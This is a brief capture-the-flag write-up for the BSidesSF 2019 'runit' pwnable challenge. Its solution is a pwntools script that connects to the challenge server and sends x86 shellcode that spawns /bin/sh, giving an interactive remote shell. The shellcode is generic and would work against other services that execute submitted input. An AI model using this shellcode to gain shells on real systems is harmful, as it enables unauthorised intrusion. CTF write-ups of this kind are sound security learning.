# **runit**

#### tag : pwnable, writeup, BSidesSF-2019-CTF

-----------------------------------------------

#### Description

>Send code to the server, and it'll run! Grab the flag from /home/ctf/flag.txt Location - runit-5094b2cb.challenges.bsidessf.net:5252

-----------------------------------------------

#### Solution

```python
from pwn import *

r = remote('runit-5094b2cb.challenges.bsidessf.net', 5252)

sh = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

r.recvuntil('\n')
r.sendline(sh)
r.interactive()
```
